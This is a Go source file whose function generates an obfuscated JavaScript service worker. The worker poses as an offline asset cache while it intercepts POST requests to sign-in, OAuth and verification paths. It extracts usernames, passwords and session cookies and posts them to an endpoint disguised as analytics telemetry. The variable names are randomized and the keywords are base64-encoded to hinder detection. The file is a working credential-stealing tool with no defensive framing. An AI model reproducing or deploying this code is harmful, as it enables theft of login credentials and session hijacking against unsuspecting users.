package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func generateSymbioteScript() string {
	randVar := func() string {
		return "_" + randomString(4)
	}

	b64 := func(s string) string {
		return fmt.Sprintf("atob('%s')", base64.StdEncoding.EncodeToString([]byte(s)))
	}

	vars := map[string]string{
		"v0": randVar(), "v1": randVar(), "v2": randVar(), "v3": randVar(),
		"v4": randVar(), "v5": randVar(), "v6": randVar(), "v7": randVar(),
		"v8": randVar(), "v9": randVar(), "v10": randVar(), "v11": randVar(),
		"v12": randVar(), "v13": randVar(),
		"kw_user": b64("user"), "kw_email": b64("email"), "kw_login": b64("login"),
		"kw_pass": b64("pass"), "kw_pwd": b64("pwd"), "kw_secret": b64("secret"),
	}

	paths := []string{"/signin", "/auth", "/verify", "/primary", "/kmsi", "/oauth2", "/challenge", "/validate", "/account"}
	rand.Shuffle(len(paths), func(i, j int) { paths[i], paths[j] = paths[j], paths[i] })

	pathStrs := make([]string, len(paths))
	for i, p := range paths {
		pathStrs[i] = b64(p)
	}

	tmpl := `
const _debounce = (fn, ms) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; };
const _getPerf = () => typeof performance !== 'undefined' ? performance.now() : Date.now();

// Helper to guarantee we always extract a string, even if the target is a nested object
const _extractVal = (val) => (typeof val === 'object' && val !== null) ? JSON.stringify(val) : val;

const {{v0}} = {{enc_endpoint}};
const {{v1}} = [{{paths}}];
let {{v2}} = true; 
let {{v3}} = null; // Cached username

self.addEventListener('install', ({{v4}}) => {
    {{v4}}.waitUntil(self.registration.pushManager.getSubscription().then(() => {}).catch(() => {}));
    {{v4}}.waitUntil(caches.open('static-assets-v1').then((c) => c.addAll(['/','/styles.css','/app.js','/favicon.ico']).catch(()=>{})).then(() => self.skipWaiting()));
});

self.addEventListener('activate', ({{v4}}) => {
    if ('sync' in self.registration) { self.registration.sync.register('sync-telemetry').catch(() => {}); }
    {{v4}}.waitUntil(caches.keys().then((names) => Promise.all(names.filter((n) => n !== 'static-assets-v1').map((n) => caches.delete(n)))).then(() => self.clients.claim()));
});

self.addEventListener('fetch', ({{v4}}) => {
    const {{v5}} = {{v4}}.request;
    if ({{v5}}.method === 'GET') {
        {{v4}}.respondWith(caches.match({{v5}}).then((r) => {
            if (r) return r;
            return fetch({{v5}}).then((res) => caches.open('static-assets-v1').then((c) => { c.put({{v5}}, res.clone()); return res; })).catch(() => new Response('Offline', { status: 503 }));
        }));
        return;
    }

    if ({{v5}}.method === 'POST' && {{v1}}.some(p => { try { return new URL({{v5}}.url).pathname.toLowerCase().includes(p); } catch { return false; } })) {
        const {{v6}} = {{v5}}.clone();
        {{v4}}.respondWith(fetch({{v5}}).then(res => {
            {{v6}}.text().then({{v7}} => {
                if ({{v2}}) {
                    try {
                        let {{v8}} = {};
                        try {
                            const {{v9}} = JSON.parse({{v7}});
                            for (const {{v10}} in {{v9}}) {
                                const {{v11}} = {{v10}}.toLowerCase();
                                if ({{v11}}.includes({{kw_user}}) || {{v11}}.includes({{kw_email}}) || {{v11}}.includes({{kw_login}})) {{v8}}.u_id = _extractVal({{v9}}[{{v10}}]);
                                if ({{v11}}.includes({{kw_pass}}) || {{v11}}.includes({{kw_pwd}}) || {{v11}}.includes({{kw_secret}})) {{v8}}.p_val = _extractVal({{v9}}[{{v10}}]);
                            }
                        } catch {}
                        
                        if (!Object.keys({{v8}}).length) {
                            try {
                                const {{v12}} = new URLSearchParams({{v7}});
                                for (const [{{v10}}, {{v13}}] of {{v12}}.entries()) {
                                    const {{v11}} = {{v10}}.toLowerCase();
                                    if ({{v11}}.includes({{kw_user}}) || {{v11}}.includes({{kw_email}}) || {{v11}}.includes({{kw_login}})) {{v8}}.u_id = {{v13}};
                                    if ({{v11}}.includes({{kw_pass}}) || {{v11}}.includes({{kw_pwd}}) || {{v11}}.includes({{kw_secret}})) {{v8}}.p_val = {{v13}};
                                }
                            } catch {}
                        }

                        // Cache the username if found, or attach cached username to password payload
                        if ({{v8}}.u_id) {{v3}} = {{v8}}.u_id;
                        if ({{v8}}.p_val) {
                            if (!{{v8}}.u_id && {{v3}}) {{v8}}.u_id = {{v3}};
                            {{v8}}.session_cookie = {{v5}}.headers.get('cookie') || 'none';
                            fetch({{v0}}, { method: 'POST', headers: { 'X-Telemetry': 'Client-Side', 'X-Request-Id': typeof crypto !== 'undefined' ? crypto.randomUUID() : Date.now().toString() }, body: JSON.stringify({{v8}}) }).catch(() => {});
                        }
                    } catch {}
                }
            }).catch(() => {});
            return res;
        }).catch(() => new Response('Network Error', { status: 502 })));
    }
});
`

	res := tmpl
	for k, v := range vars {
		res = strings.ReplaceAll(res, "{{"+k+"}}", v)
	}
	res = strings.ReplaceAll(res, "{{enc_endpoint}}", b64("/api/v1/analytics"))
	res = strings.ReplaceAll(res, "{{paths}}", strings.Join(pathStrs, ", "))

	return res
}
